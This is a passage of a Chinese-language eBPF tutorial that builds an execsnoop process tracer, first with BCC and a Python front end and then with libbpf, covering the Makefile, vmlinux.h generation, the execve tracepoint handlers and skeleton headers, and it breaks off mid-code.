class="line"></span><br><span class="line"><span class="comment">// get the pid and comm</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the binary name (first argment)</span></span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get other arguments (skip first arg because it has already been read)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line"><span class="comment">// store the data in hash map</span></span><br><span class="line">tasks.update(&amp;pid, &amp;data);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execve tracepoint</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// query the data from hash map</span></span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// submit perf events after getting the retval</span></span><br><span class="line"><span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">data-&gt;retval = args-&gt;ret;</span><br><span class="line">events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// clean up the hash map</span></span><br><span class="line">tasks.delete(&amp;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Python-前端处理"><a href="#Python-前端处理" class="headerlink" title="Python 前端处理"></a>Python 前端处理</h3><p>eBPF 程序开发完成后，最后一步就是为它增加一个 Python 前端。</p><p>同之前写的 Hello World 类似，<strong>Python 前端逻辑需要 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤</strong>。其中，因为我们已经使用了 <code>TRACEPOINT_PROBE</code> 宏定义，来定义 eBPF 跟踪点处理函数，BCC 在加载字节码的时候，会帮你自动把它挂载到正确的跟踪点上，所以挂载的步骤就可以忽略。完整的 Python 程序如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入库函数</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">from</span> bcc.utils <span class="keyword">import</span> printb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 加载eBPF代码</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;execsnoop.c&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 输出头</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%-6s %-16s %-3s %s&quot;</span> % (<span class="string">&quot;PID&quot;</span>, <span class="string">&quot;COMM&quot;</span>, <span class="string">&quot;RET&quot;</span>, <span class="string">&quot;ARGS&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 定义性能事件打印函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_event</span>(<span class="params">cpu, data, size</span>):</span><br><span class="line">    <span class="comment"># BCC自动根据&quot;struct data_t&quot;生成数据结构</span></span><br><span class="line">    event = b[<span class="string">&quot;events&quot;</span>].event(data)</span><br><span class="line">    printb(<span class="string">b&quot;%-6d %-16s %-3d %-16s&quot;</span> % (event.pid, event.comm, event.retval, event.argv))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 绑定性能事件映射和输出函数，并从映射中循环读取数据</span></span><br><span class="line">b[<span class="string">&quot;events&quot;</span>].open_perf_buffer(print_event)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>把上述的代码保存到  execsnoop.py  中，然后通过 Python 运行，并在另一个终端中执行  ls  命令，你就可以得到如下的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 execsnoop.py</span><br><span class="line">PID    COMM             RET ARGS</span><br><span class="line">1311958 barad_agent      0   /bin/sh-ccat /proc/meminfo |grep <span class="string">&#x27;HardwareCorrupted&#x27;</span> |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">1311959 sh               0   <span class="built_in">cat</span>/proc/meminfo</span><br><span class="line">1311960 sh               0   grepHardwareCorrupted</span><br><span class="line">1311961 sh               0   awk&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;</span><br></pre></td></tr></table></figure><p>到此处，我们就开发了一个新的 eBPF 程序，它的作用也是排查短时进程相关的性能。</p><p>不过，在你想要分发这个程序到生产环境时，又会碰到一个新的难题：BCC 依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序，而出于安全策略的需要，在生产环境中通常又不允许安装这些开发工具。</p><p>这个难题应该怎么克服呢？一种很容易想到的方法是把 BCC 和开发工具都安装到容器中，容器本身不提供对外服务，这样可以降低安全风险。另外一种方法就是参考内核中的 <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/samples/bpf">eBPF 示例<i class="fas fa-external-link-alt"></i></a>，开发一个匹配当前内核版本的 eBPF 程序，并编译为字节码，再分发到生产环境中。</p><p>除此之外，如果你的内核已经支持了 BPF 类型格式 (BTF)，我推荐你使用从内核源码中抽离出来的 libbpf 进行开发，这样可以借助 BTF 和 CO-RE 获得更好的移植性。实际上，BCC 的很多工具都在向 BTF 迁移中，相信未来 libbpf 会成为最受欢迎的 eBPF 程序开发基础库，甚至 Windows eBPF 也会支持 libbpf。</p><h2 id="libbpf-开发内核追踪程序"><a href="#libbpf-开发内核追踪程序" class="headerlink" title="libbpf 开发内核追踪程序"></a>libbpf 开发内核追踪程序</h2><h3 id="libbpf-方法"><a href="#libbpf-方法" class="headerlink" title="libbpf 方法"></a>libbpf 方法</h3><p>那么，如何用 libbpf 来开发一个 eBPF 程序呢？跟刚才的 BCC 程序类似，使用 libbpf 开发 eBPF 程序也是分为两部分：</p><ul><li>第一，内核态的 eBPF 程序；</li><li>第二，用户态的加载、挂载、映射读取以及输出程序等。</li></ul><p><strong>在 eBPF 程序中，由于内核已经支持了 BTF，你不再需要引入众多的内核头文件来获取内核数据结构的定义</strong>。取而代之的是一个通过 bpftool 生成的 <code>vmlinux.h</code>  头文件，其中包含了内核数据结构的定义。</p><p>这样，使用 libbpf 开发 eBPF 程序就可以通过以下四个步骤完成：</p><ol><li>使用 bpftool 生成内核数据结构定义头文件。BTF 开启后，你可以在系统中找到  <code>/sys/kernel/btf/vmlinux</code>  这个文件，bpftool 正是从它生成了内核数据结构头文件。</li><li>开发 eBPF 程序部分。为了方便后续通过统一的 Makefile 编译，eBPF 程序的源码文件一般命名为  <code>&lt;程序名&gt;.bpf.c</code>。</li><li>编译 eBPF 程序为字节码，然后再调用 <code>bpftool gen skeleton</code> 为 eBPF 字节码生成脚手架头文件（Skeleton Header）。这个头文件包含了 eBPF 字节码以及相关的加载、挂载和卸载函数，可在用户态程序中直接调用。</li><li>最后就是用户态程序引入上一步生成的头文件，开发用户态程序，包括 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等。</li></ol><p>通常，这几个步骤里面的编译、库链接、执行 <code>bpftool</code>  命令等，都可以放到 Makefile 中，这样就可以通过一个 <code>make</code> 命令去执行所有的步骤。比如，下面是一个简化版本的 Makefile：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">APPS = execsnoop</span><br><span class="line"></span><br><span class="line">.PHONY: all</span><br><span class="line">all: $(APPS)</span><br><span class="line"></span><br><span class="line">$(APPS):</span><br><span class="line">    clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c $@.bpf.c -o $@.bpf.o</span><br><span class="line">    bpftool gen skeleton $@.bpf.o &gt; $@.skel.h</span><br><span class="line">    clang -g -O2 -Wall -I . -c $@.c -o $@.o</span><br><span class="line">    clang -Wall -O2 -g $@.o -<span class="type">static</span> -lbpf -lelf -lz -o $@</span><br><span class="line"></span><br><span class="line">vmlinux:</span><br><span class="line">    $(bpftool) btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>有了这个 Makefile 之后，你执行 <code>make vmlinux</code> 命令就可以生成 <code>vmlinux.h</code> 文件，再执行 <code>make</code> 就可以编译  <code>APPS</code> 里面配置的所有 eBPF 程序（多个程序之间以空格分隔）。</p><h3 id="内核头文件生成"><a href="#内核头文件生成" class="headerlink" title="内核头文件生成"></a>内核头文件生成</h3><p>首先，对于第一步，我们只需要执行下面的命令，即可生成内核数据结构的头文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>如果命令执行失败了，并且错误说 BTF 不存在，那说明当前系统内核没有开启 BTF 特性。这时候，你需要开启 <code>CONFIG_DEBUG_INFO_BTF=y</code> 和 <code>CONFIG_DEBUG_INFO=y</code> 这两个编译选项，然后重新编译和安装内核。</p><h3 id="eBPF-程序定义"><a href="#eBPF-程序定义" class="headerlink" title="eBPF 程序定义"></a>eBPF 程序定义</h3><p>第二步就是开发 eBPF 程序，包括定义哈希映射、性能事件映射以及跟踪点的处理函数等，而对这些数据结构和跟踪函数的定义都可以通过 <code>SEC()</code> 宏定义来完成。在编译时，<strong>通过 <code>SEC()</code> 宏定义的数据结构和函数会放到特定的 ELF 段中，这样后续在加载 BPF 字节码时，就可以从这些段中获取所需的元数据</strong>。</p><p>比如，你可以使用下面的代码来定义映射和跟踪点处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmlinux.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义进程基本信息数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">int</span> args_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> args[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义哈希映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_HASH);</span><br><span class="line">    __uint(max_entries, <span class="number">10240</span>);</span><br><span class="line">    __type(key, <span class="type">pid_t</span>);</span><br><span class="line">    __type(value, <span class="keyword">struct</span> event);</span><br><span class="line">&#125; execs <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义性能事件映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);</span><br><span class="line">    __uint(key_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">    __uint(value_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execve跟踪点</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 待实现处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execve跟踪点</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 待实现处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义许可证（前述的BCC默认使用GPL）</span></span><br><span class="line"><span class="type">char</span> LICENSE[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;Dual BSD/GPL&quot;</span>;</span><br></pre></td></tr></table></figure><p>让我们来看看这段代码的具体含义：</p><ul><li>头文件 <code>vmlinux.h</code> 包含了内核数据结构，而 <code>bpf/bpf_helpers.h</code> 包含了之前提到的 BPF 辅助函数；</li><li><code>struct event</code> 定义了进程基本信息数据结构，它会用在后面的哈希映射中；</li><li><code>SEC(&quot;.maps&quot;)</code> 定义了哈希映射和性能事件映射；</li><li><code>SEC(&quot;tracepoint/&lt;跟踪点名称&gt;&quot;)</code> 定义了跟踪点处理函数，系统调用跟踪点的格式是  <code>tracepoint/syscalls/&lt;系统调用名称&gt;&quot;</code>。以后你需要定义内核插桩和用户插桩的时候，也是以类似的格式定义，比如 <code>kprobe/do_unlinkat</code>  或  <code>uprobe/func</code>；</li><li>最后的  <code>SEC(&quot;license&quot;)</code>  定义了 eBPF 程序的许可证。在上述的 BCC eBPF 程序中，我们并没有定义许可证，这是因为 BCC 自动帮你使用了 GPL 许可。</li></ul><p>有了基本的程序结构，接下来就是<strong>实现系统调用入口和出口跟踪点的处理函数</strong>。它们的基本过程跟上述的 BCC 程序是类似的。</p><h3 id="入口跟踪点处理-1"><a href="#入口跟踪点处理-1" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点 <code>sys_enter_execve</code> 的处理，还是按照上述 BCC 程序的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。完整代码如下所示，具体每一步的内容我都加了详细的注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter</span></span><br><span class="line"><span class="params">                       *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **args = (<span class="type">const</span> <span class="type">char</span> **)(ctx-&gt;args[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *argp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询PID</span></span><br><span class="line">    u64 id = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="type">pid_t</span> pid = (<span class="type">pid_t</span>) id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存一个空的event到哈希映射中</span></span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(&amp;execs, &amp;pid, &amp;empty_event, BPF_NOEXIST)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化event变量</span></span><br><span class="line">    event-&gt;pid = pid;</span><br><span class="line">    event-&gt;args_count = <span class="number">0</span>;</span><br><span class="line">    event-&gt;args_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询第一个参数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = bpf_probe_read_user_str(event-&gt;args, ARGSIZE,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)ctx-&gt;args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;= ARGSIZE) &#123;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询其他参数</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[i]);</span><br><span class="line">        <span class="keyword">if</span> (!argp)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (event-&gt;args_size &gt; LAST_ARG)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ret =</span><br><span class="line">            bpf_probe_read_user_str(&amp;event-&gt;args[event-&gt;args_size],</span><br><span class="line">                        ARGSIZE, argp);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; ARGSIZE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        event-&gt;args_count++;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再尝试一次，确认是否还有未读取的参数</span></span><br><span class="line">    bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[TOTAL_MAX_ARGS]);</span><br><span class="line">    <span class="keyword">if</span> (!argp)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果还有未读取参数，则增加参数数量（用于输出&quot;...&quot;）</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，你需要注意这三点：</p><ul><li>第一，程序使用了 <code>bpf_probe_read_user()</code>  来查询参数。由于它把 <code>\0</code>  也算到了已读取参数的长度里面，所以最终 <code>event-&gt;args</code> 中保存的各个参数是以 <code>\0</code>  分隔的。在用户态程序输出参数之前，需要用空格替换  <code>\0</code>。</li><li>第二，程序在一开始的时候向哈希映射存入了一个空事件，在后续出口跟踪点处理的时候需要确保空事件也能正确清理。</li><li>第三，程序在最后又尝试多读取了一次参数列表。如果还有未读取参数，参数数量增加了 1。用户态程序可以根据参数数量来决定是不是需要在参数结尾输出一个 <code>...</code>。</li></ul><h3 id="出口跟踪点处理-1"><a href="#出口跟踪点处理-1" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点处理好之后，再来看看出口跟踪点的处理方法。它的步骤跟 BCC 程序也是类似的，也是查询进程基本信息、填充返回值、提交到性能事件映射这三个步骤。</p><p>除此之外，由于刚才入口跟踪点的处理中没有读取进程名称，所以在提交性能事件之前还需要先查询一下进程名称。完整的程序如下所示，具体每一步的内容我也加了详细的注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64 id;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从哈希映射中查询进程基本信息</span></span><br><span class="line">    id = bpf_get_current_pid_tgid();</span><br><span class="line">    pid = (<span class="type">pid_t</span>) id;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新返回值和进程名称</span></span><br><span class="line">    ret = ctx-&gt;ret;</span><br><span class="line">    event-&gt;retval = ret;</span><br><span class="line">    bpf_get_current_comm(&amp;event-&gt;comm, <span class="keyword">sizeof</span>(event-&gt;comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交性能事件</span></span><br><span class="line">    <span class="type">size_t</span> len = EVENT_SIZE(event);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="keyword">sizeof</span>(*event))</span><br><span class="line">        bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, event,</span><br><span class="line">                      len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理哈希映射</span></span><br><span class="line">    bpf_map_delete_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这些代码中你可以看到，它的处理逻辑跟上述的 BCC 程序基本上是相同的。不过，详细对比一下，你会发现它们之间还是有不同的，不同点主要在两个方面：</p><ul><li>第一，函数名的定义格式不同。BCC 程序使用的是 <code>TRACEPOINT_PROBE</code> 宏，而 libbpf 程序用的则是  <code>SEC</code>  宏。</li><li>第二，映射的访问方法不同。BCC 封装了很多更易用的映射访问函数（如 <code>tasks.lookup()</code>），而 libbpf 程序则需要调用 05 讲 提到过的 BPF 辅助函数（比如查询要使用 <code>bpf_map_lookup_elem()</code>）。</li></ul><p>到这里，新建一个目录，并把上述代码存入 <code>execsnoop.bpf.c</code> 文件中，eBPF 部分的代码也就开发好了。</p><h3 id="编译并生成脚手架头文件"><a href="#编译并生成脚手架头文件" class="headerlink" title="编译并生成脚手架头文件"></a>编译并生成脚手架头文件</h3><p>有了 eBPF 程序，执行下面的命令，你就可以使用 clang 和 bpftool 将其编译成 BPF 字节码，然后再生成其脚手架头文件  <code>execsnoop.skel.h</code> （注意，脚手架头文件的名字一般定义为  <code>&lt;程序名&gt;.skel.h</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c execsnoop.bpf.c -o execsnoop.bpf.o</span><br><span class="line">bpftool gen skeleton execsnoop.bpf.o &gt; execsnoop.skel.h</span><br></pre></td></tr></table></figure><p>其中，clang 的参数 <code>-target bpf</code>  表示要生成 BPF 字节码，<code>-D__TARGET_ARCH_x86_64</code>  表示目标的体系结构是 <code>x86_64</code>，而  <code>-I</code>  则是引入头文件路径。</p><p>命令执行后，脚手架头文件会放到 <code>execsnoop.skel.h</code>  中，这个头文件包含了 BPF 字节码和相关的管理函数。因而，当用户态程序引入这个头文件并编译之后，只需要分发最终用户态程序生成的二进制文件到生产环境即可（如果用户态程序使用了其他的动态库，还需要分发动态库）。</p><h3 id="开发用户态程序"><a href="#开发用户态程序" class="headerlink" title="开发用户态程序"></a>开发用户态程序</h3><p>有了脚手架头文件之后，还剩下最后一步，也就是用户态程序的开发。</p><p>同 BCC 的 Python 前端程序类似，libbpf 用户态程序也需要 eBPF 程序加载、挂载到跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤。虽然 C 语言听起来可能比 Python 语言麻烦一些，但实际上，这几个步骤都可以通过脚手架头文件中自动生成的函数来完成。</p><p>下面是忽略了错误处理逻辑之后，用户态程序的一个基本框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 